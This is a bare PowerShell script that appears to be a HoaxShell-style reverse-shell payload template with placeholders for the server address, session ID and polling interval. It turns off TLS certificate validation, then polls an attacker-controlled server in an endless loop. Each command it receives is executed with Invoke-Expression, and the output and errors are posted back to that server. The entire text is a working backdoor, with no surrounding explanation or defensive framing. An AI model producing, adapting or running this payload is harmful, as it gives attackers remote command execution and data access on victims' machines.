add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='*SERVERIP*';$i='*SESSIONID*';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/4db6390f840c -Headers @{"X-hoax-id"=$i};while ($true){$c=Invoke-WebRequest -UseBasicParsing -Uri $p$s/c5233a465a7d -Headers @{"X-hoax-id"=$i};if ($c.Content -ne 'None') {$r=iex $c.Content -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/7f47fd7ae404 -Method POST -Headers @{"X-hoax-id"=$i} -Body $r$e} sleep *FREQ*}
